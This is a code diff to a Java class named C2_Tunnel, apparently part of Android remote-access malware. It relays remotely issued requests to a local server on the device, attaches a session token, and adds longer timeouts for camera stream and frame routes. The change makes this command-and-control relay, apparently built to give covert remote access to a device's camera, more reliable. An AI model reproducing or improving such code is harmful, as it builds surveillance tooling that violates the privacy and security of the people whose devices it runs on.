@@ -138,12 +138,24 @@ public class C2_Tunnel {
     }
 
     private static void relayLocalRequest(String method, String path, String body, String requestId) {
+        HttpURLConnection conn = null;
         try {
-            URL url = new URL("http://127.0.0.1:" + FirebaseConfig.DEFAULT_PORT + path);
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            // [TUNNEL_ROUTING] Handle root/terminal aliases
+            String localPath = path;
+            if (localPath == null || localPath.isEmpty()) {
+                localPath = "/";
+            }
+            
+            URL url = new URL("http://127.0.0.1:" + FirebaseConfig.DEFAULT_PORT + localPath);
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setInstanceFollowRedirects(false); // Do not follow redirects internally
             conn.setRequestMethod(method);
+            
+            // Streaming routes (/camera/stream, /camera/frame) need adaptive timeouts
+            boolean isStreamRoute = localPath.contains("/stream") || localPath.contains("/frame");
             conn.setConnectTimeout(10000);
-            conn.setReadTimeout(15000);
+            conn.setReadTimeout(isStreamRoute ? 60000 : 15000);
+            
             conn.setRequestProperty("Accept-Encoding", "identity");
             conn.setRequestProperty("Cookie", "token=" + WorkManager_Sync.activeSessionToken);
 
@@ -160,10 +172,12 @@ public class C2_Tunnel {
 
             InputStream is = (code < 400) ? conn.getInputStream() : conn.getErrorStream();
             ByteArrayOutputStream buffer = new ByteArrayOutputStream();
-            byte[] data = new byte[16384];
-            int nRead;
-            while ((nRead = is.read(data, 0, data.length)) != -1) {
-                buffer.write(data, 0, nRead);
+            if (is != null) {
+                byte[] data = new byte[16384];
+                int nRead;
+                while ((nRead = is.read(data, 0, data.length)) != -1) {
+                    buffer.write(data, 0, nRead);
+                }
             }
 
             JSONObject resp = new JSONObject();
@@ -179,6 +193,10 @@ public class C2_Tunnel {
 
         } catch (Exception e) {
             Log.e(TAG, "Relay Error: " + e.getMessage());
+        } finally {
+            if (conn != null) {
+                conn.disconnect();
+            }
         }
     }
 
